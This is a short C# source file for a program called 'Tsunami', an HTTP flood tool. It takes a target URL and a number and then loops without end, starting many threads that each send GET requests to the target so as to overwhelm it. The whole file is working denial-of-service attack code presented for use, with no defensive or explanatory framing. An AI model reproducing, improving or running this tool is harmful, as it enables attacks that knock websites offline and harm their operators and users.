using System.Net;

namespace Tsunami.Main
{
    public class TsunamiEntrypoint
    {
        public static void Main(string[] args)
        {
            try
            {
                Console.WriteLine($"Flooding {args[0]}");

                int? multiplier = null;

                if(args.Count() > 1)
                {
                    try
                    {
                        multiplier = int.Parse(args[2]);
                    } catch(Exception ex)
                    {
                        Console.WriteLine("No multiplier detected");
                        multiplier = 100;
                    }
                } else
                {
                    multiplier = 100;
                }

                Console.WriteLine($"Int with multiplier is {Convert.ToInt32(args[1]) * multiplier}");

                while (true)
                {
                    for (int x = 0; x < Convert.ToInt32(args[1]) * multiplier; x++)
                    {
                        ThreadStart threadInfo = new(() => ThreadHandler(args[0]));
                        Thread mainThread = new(threadInfo);
                        mainThread.Start();
                    }
                }
            } catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine("SYNTAX: url integer (integer is multiplied by 100 by default) multiplier");
            }
        }

        public static async Task ThreadHandler(string url)
        {
            WebRequest request = WebRequest.Create(url);
            request.Method = "GET";

            WebResponse response = request.GetResponse();
            Stream stream = response.GetResponseStream();

            StreamReader reader = new StreamReader(stream);
            string data = reader.ReadToEnd();

            Console.WriteLine(data);
        }
    }
}